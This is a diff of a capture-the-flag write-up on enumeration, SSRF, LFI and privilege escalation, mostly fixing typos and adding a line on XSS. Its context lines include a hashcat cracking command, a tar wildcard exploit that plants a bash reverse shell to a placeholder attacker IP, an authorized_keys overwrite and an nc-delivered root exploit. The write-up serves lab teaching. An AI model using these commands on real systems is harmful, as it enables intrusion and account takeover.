@@ -4,7 +4,7 @@ This is an enumeration, SSRF, LFI, and privesc hacking challenge.
 
 ## Recon
 
-We start out with a basic recon nmap scan. This reveals that there's an http and ssh service. Trying an anonymous logon to ssh doesn't work.
+We start out with a basic nmap scan for recon. This reveals that there's an http and ssh service. Trying an anonymous logon to ssh doesn't work.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -196,7 +196,7 @@ We can see the users table.
 
 ![](images/10.PNG)
 
-Lets grab the hash from kyle and crack it with `hashcat -O -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt`.
+Let's grab the hash from kyle and crack it with `hashcat -O -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt`.
 
 cracked.txt
 ```
@@ -242,7 +242,7 @@ cd /var/www/internal/invoices
 tar -zcf /home/kyle/backups/invoices.tgz *
 ```
 
-In the script, we can see that it creates a backup in /home/kyle which we cannot access. We cannot do this as our current user, so it means that we may be able to escalate our priviliges with this. We can try to do a tar wildcard exploit.
+In the script, we can see that it creates a backup in /home/kyle which we cannot access. We cannot do this as our current user, so it means that we may be able to escalate our privileges with this. We can try to do a tar wildcard exploit.
 
 ```bash
 cd /var/www/internal/invoices; echo "/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9999 0>&1'" > shell.sh; echo "" > "--checkpoint-action=exec=sh shell.sh"; echo "" > --checkpoint=1; chmod 777 shell.sh
@@ -252,7 +252,7 @@ When the cron job runs again in a minute, we get a shell on our end as `kyle`.
 
 ## Root Privesc
 
-Lets replace his key with our own key pair generated from `ssh-keygen`.
+Let's replace his key with our own key pair generated from `ssh-keygen`.
 
 ```bash
 echo "ssh-rsa AAAAB3N[...]eEP+QL2S+SQq/QrP0= kali@kali" > ~/.ssh/authorized_keys
@@ -302,3 +302,7 @@ nc -nvlp 6000 > exploit_v2.sh; chmod 777 exploit_v2.sh  #copy exploit script and
 sh exploit_v2.sh                                        #run exploit
 /tmp/sh -p                                              #gives us root shell
 ```
+
+## Further discussion
+
+The PDF exploit can also give us server-side XSS. Having wordpress credentials, we can also create persistent XSS.
